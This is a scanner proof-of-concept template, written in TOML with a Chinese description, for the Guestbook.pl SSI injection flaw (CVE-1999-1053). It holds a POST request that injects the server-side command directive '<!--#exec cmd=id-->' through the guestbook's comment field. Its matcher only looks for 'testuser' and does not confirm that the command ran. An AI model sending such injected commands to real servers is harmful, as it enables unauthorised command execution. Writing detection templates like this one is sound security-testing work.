[info]
author = "ave"
description = "检测 Matt Wright Guestbook.pl 2.3.1 服务器端包含（SSI）注入漏洞。通过在留言内容中注入 <!--#exec cmd--> SSI 命令，绕过 <!-- --> 分隔符过滤机制，在 Apache 1.3.9 等支持非标准 SSI 关闭序列的服务器上执行任意系统命令。"
id = "POC-AVE-1999-1686"
name = "CVE-1999-1053 Matt Wright Guestbook.pl SSI Injection PoC"
severity = "high"
tags = ["ave-1999-1686"]
vuln_id = [
    "CVE-1999-1053",
    "AVE-1999-1686",
]

[poc]
logic = "all"

[[poc.requests]]
method = "POST"
path = "/{{BaseURL}}/cgi-bin/guestbook.pl"
protocol = "http"

[poc.requests.body]
content = "realname=testuser&username=testuser&url=&city=&state=&comment=<!--#exec cmd=id-->"
type = "form"

[poc.requests.headers]
Content-Type = "application/x-www-form-urlencoded"
User-Agent = "Mozilla/5.0"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = ["testuser"]
